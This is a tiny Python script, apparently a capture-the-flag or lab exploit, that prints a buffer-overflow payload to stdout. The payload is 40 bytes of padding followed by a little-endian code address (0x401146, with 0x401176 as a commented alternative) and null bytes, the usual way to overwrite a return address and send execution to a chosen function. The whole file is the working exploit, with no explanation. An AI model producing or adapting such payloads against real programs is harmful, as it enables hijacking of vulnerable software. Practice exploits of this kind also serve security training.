import sys

sys.stdout.buffer.write(('a' * 40).encode() + bytes.fromhex('461140') + b'\0\0\0\0\0')
# sys.stdout.buffer.write(('a' * 40).encode() + bytes.fromhex('761140') + b'\0\0\0\0\0')
print()
print()